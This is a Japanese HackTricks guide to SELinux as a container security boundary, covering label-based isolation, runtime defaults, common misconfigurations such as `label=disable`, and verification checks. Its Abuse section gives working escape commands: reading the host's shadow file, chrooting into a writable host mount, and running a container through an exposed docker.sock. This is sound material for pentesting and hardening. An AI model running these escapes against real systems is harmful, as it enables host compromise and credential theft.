# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux は**ラベルベースの強制アクセス制御**システムです。関連するすべてのプロセスとオブジェクトにはセキュリティコンテキストを付与でき、ポリシーによって、どのドメインがどのタイプと、どのような方法で相互作用できるかが決定されます。コンテナ化された環境では通常、runtime がコンテナプロセスを制限されたコンテナドメインで起動し、コンテナの内容に対応するタイプのラベルを付けます。ポリシーが適切に機能していれば、プロセスは自身のラベルがアクセスすることを想定されている対象を読み書きできる一方、マウントを通じてその内容が可視化された場合でも、ホスト上の他のコンテンツへのアクセスは拒否されます。

これは、一般的な Linux コンテナデプロイメントで利用できる、最も強力なホスト側の保護機構の 1 つです。Fedora、RHEL、CentOS Stream、OpenShift、その他の SELinux 中心のエコシステムでは特に重要です。これらの環境で SELinux を無視するレビュー担当者は、ホスト侵害への明白に見える経路が実際にはなぜブロックされているのかを誤解することがよくあります。

## AppArmor Vs SELinux

高レベルで最も簡単な違いは、AppArmor がパスベースであるのに対し、SELinux は**ラベルベース**であることです。これはコンテナセキュリティに大きな影響を与えます。パスベースのポリシーでは、同じホストコンテンツが予期しないマウントパスで可視化された場合、異なる動作をする可能性があります。一方、ラベルベースのポリシーでは、オブジェクトのラベルが何であり、プロセスドメインがそのオブジェクトに対して何を実行できるかが判断されます。これによって SELinux が単純になるわけではありませんが、AppArmor ベースのシステムで防御側が意図せず想定してしまう、パスに関するトリックの一種に対して堅牢になります。

このモデルはラベル指向であるため、コンテナのボリューム処理とラベルの再設定に関する判断はセキュリティ上重要です。runtime やオペレーターが「マウントを機能させる」ためにラベルを広範囲に変更すると、ワークロードを隔離するはずだったポリシー境界が、意図したものよりはるかに弱くなる可能性があります。

## Lab

ホスト上で SELinux が有効かどうかを確認するには:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
ホスト上の既存のラベルを確認するには:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
通常の実行とラベリングを無効にした場合を比較するには：
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinuxが有効なホストでは、これは非常に実践的なデモンストレーションです。期待されるコンテナドメインで実行されているワークロードと、その強制適用レイヤーが取り除かれたワークロードの違いを示すためです。

## Runtime Usage

Podmanは、SELinuxがプラットフォームのデフォルトの一部であるシステム上で、SELinuxと特に相性よく動作します。Rootless PodmanとSELinuxの組み合わせは、主流のコンテナ環境における最も強固な基本構成の1つです。ホスト側ではプロセスがすでに非特権であり、さらにMACポリシーによって隔離されるためです。Dockerも、サポートされている環境ではSELinuxを利用できますが、管理者がボリュームのラベル付けに関する問題を回避するために無効化することがあります。CRI-OとOpenShiftは、コンテナ分離の仕組みの一部としてSELinuxに大きく依存しています。KubernetesでもSELinux関連の設定を公開できますが、その価値は当然ながら、ノードOSが実際にSELinuxをサポートし、強制適用しているかどうかに左右されます。

繰り返し得られる教訓は、SELinuxは単なる付加要素ではないということです。SELinuxを中心に構築されたエコシステムでは、SELinuxは想定されるセキュリティ境界の一部です。

## Misconfigurations

典型的なミスは`label=disable`です。運用上は、ボリュームのマウントが拒否された際に、ラベル付けの仕組みを修正する代わりに、短期的な最も簡単な対処としてSELinuxを問題から外してしまうことで発生します。もう1つのよくあるミスは、ホスト上のコンテンツに対する誤った再ラベル付けです。広範囲な再ラベル付けによってアプリケーションは動作するようになるかもしれませんが、その一方で、コンテナがアクセスできる範囲が当初の意図を大きく超えて拡大する可能性があります。

また、**installed** SELinuxと**effective** SELinuxを混同しないことも重要です。ホストがSELinuxをサポートしていても、permissiveモードになっている場合や、runtimeが想定されたドメインでワークロードを起動していない場合があります。そのようなケースでは、ドキュメントから想定されるよりも保護が大幅に弱くなります。

## Abuse

SELinuxが存在しない、permissiveである、またはワークロードに対して広範囲に無効化されている場合、ホストマウントされたパスははるかに悪用しやすくなります。本来であればラベルによって制限されるはずの同じbind mountが、ホストデータへのアクセスやホストの変更に直接つながる経路になる可能性があります。これは、書き込み可能なボリュームマウント、コンテナruntimeのディレクトリ、または利便性のために機密性の高いホストパスを公開する運用上の近道と組み合わさった場合に、特に重要です。

SELinuxがあると、runtimeのフラグが似ているにもかかわらず、あるホストでは一般的なbreakoutのwriteupがすぐに成功し、別のホストでは何度試しても失敗する理由を説明できることがよくあります。欠けている要素は、namespaceやcapabilityではなく、維持されたラベル境界であることが少なくありません。

最も迅速な実践的チェックは、アクティブなcontextを比較し、そのうえで通常はラベルによって制限されるはずのマウント済みホストパスやruntimeディレクトリを調査することです。
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
ホストの bind mount が存在し、SELinux labeling が無効化または弱められている場合、まず information disclosure が発生することが多い。
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
マウントが書き込み可能で、kernel の観点から container が実質的に host-root である場合、次のステップは推測ではなく、制御された host の変更をテストすることです。
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux対応ホストでは、runtime stateディレクトリ周辺のlabelsが失われると、直接的なprivilege-escalation pathsが露呈する可能性もあります:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
これらのコマンドは full escape chain の代わりにはなりませんが、ホストデータへのアクセスやホスト側のファイル変更を妨げていたのが SELinux かどうかを、非常に迅速に判断できます。

### SELinux Disabled + Writable Host Mount の完全な例

SELinux labeling が無効で、ホストの filesystem が `/host` に writable で mount されている場合、full host escape は通常の bind-mount abuse case になります:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot` が成功すると、コンテナプロセスはホストファイルシステムから動作するようになります。
```bash
id
hostname
cat /etc/passwd | tail
```
### 完全な例: SELinux 無効 + Runtime Directory

labels を無効にした後に workload が runtime socket に到達できる場合、escape を runtime に委任できます:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
重要な点は、SELinux がこの種の host-path や runtime-state へのアクセスを実際に防止する制御になっていることが多いということです。

## チェック

SELinux のチェックの目的は、SELinux が有効になっていることを確認し、現在の security context を特定し、対象のファイルやパスが実際にラベルによって制限されているかどうかを確認することです。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
ここで重要なのは次の点です。

- `getenforce` は理想的には `Enforcing` を返すべきです。`Permissive` または `Disabled` の場合、SELinux セクション全体の意味が変わります。
- 現在のプロセスコンテキストが想定外、または広すぎるように見える場合、workload が意図した container policy の下で実行されていない可能性があります。
- host-mounted files または runtime directories に、プロセスが自由にアクセスできるラベルが付いている場合、bind mounts ははるかに危険になります。

SELinux 対応プラットフォーム上の container を確認する際、ラベリングを二次的な詳細として扱ってはいけません。多くの場合、host がまだ compromise されていない主な理由の一つがこれです。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation は SELinux-enabled hosts で利用できますが、正確な挙動は host / daemon configuration に依存します | `--security-opt label=disable`、bind mounts の broad relabeling、`--privileged` |
| Podman | SELinux hosts では一般的に enabled | SELinux systems 上の Podman では、無効化されていない限り SELinux separation は通常の構成要素です | `--security-opt label=disable`、`containers.conf` の `label=false`、`--privileged` |
| Kubernetes | Pod level では通常自動的に割り当てられない | SELinux support は存在しますが、Pods では通常 `securityContext.seLinuxOptions` または platform-specific defaults が必要です。runtime と node の support も必要です | weak または broad な `seLinuxOptions`、permissive / disabled nodes 上での実行、labeling を無効化する platform policies |
| CRI-O / OpenShift style deployments | 一般的に大きく依存 | これらの environments では、SELinux は node isolation model の中核となっていることがよくあります | access を過度に広げる custom policies、compatibility のための labeling の無効化 |

SELinux の defaults は seccomp の defaults よりも distribution-dependent です。Fedora/RHEL/OpenShift-style systems では、SELinux が isolation model の中心となっていることがよくあります。non-SELinux systems では、単に存在しません。
{{#include ../../../../banners/hacktricks-training.md}}
